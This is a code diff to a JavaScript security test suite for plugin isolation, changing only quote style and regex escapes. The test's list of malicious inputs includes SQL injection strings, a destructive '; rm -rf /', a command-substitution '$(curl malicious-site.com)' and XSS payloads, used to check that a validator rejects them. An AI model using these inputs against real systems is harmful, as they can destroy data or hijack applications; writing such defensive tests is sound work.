@@ -119,7 +119,7 @@ describe('Plugin Security and Isolation', () => {
         
         validateInput(input) {
           const maxLength = 10000;
-          const allowedChars = /^[a-zA-Z0-9\s\.,\?!;:\-_'"()\[\]{}@#$%^&*+=|\\/<>~`]*$/;
+          const allowedChars = /^[a-zA-Z0-9\s.,?!;:\-_'"()[\]{}@#$%^&*+=|\\/<>~`]*$/;
           
           if (input.length > maxLength) {
             throw new Error('Input exceeds maximum length');
@@ -482,13 +482,13 @@ describe('Plugin Security and Isolation', () => {
       };
 
       const maliciousInputs = [
-        "'; DROP TABLE users; --",
-        "1' UNION SELECT * FROM passwords--",
-        "; rm -rf /",
-        "$(curl malicious-site.com)",
-        "<script>alert('XSS')</script>",
-        "javascript:alert('XSS')",
-        "onclick=\"alert('XSS')\""
+        '\'; DROP TABLE users; --',
+        '1\' UNION SELECT * FROM passwords--',
+        '; rm -rf /',
+        '$(curl malicious-site.com)',
+        '<script>alert(\'XSS\')</script>',
+        'javascript:alert(\'XSS\')',
+        'onclick="alert(\'XSS\')"'
       ];
 
       for (const input of maliciousInputs) {
@@ -502,9 +502,9 @@ describe('Plugin Security and Isolation', () => {
 
       // Test safe inputs
       const safeInputs = [
-        "What is machine learning?",
-        "Explain neural networks",
-        "How does AI work?"
+        'What is machine learning?',
+        'Explain neural networks',
+        'How does AI work?'
       ];
 
       for (const input of safeInputs) {
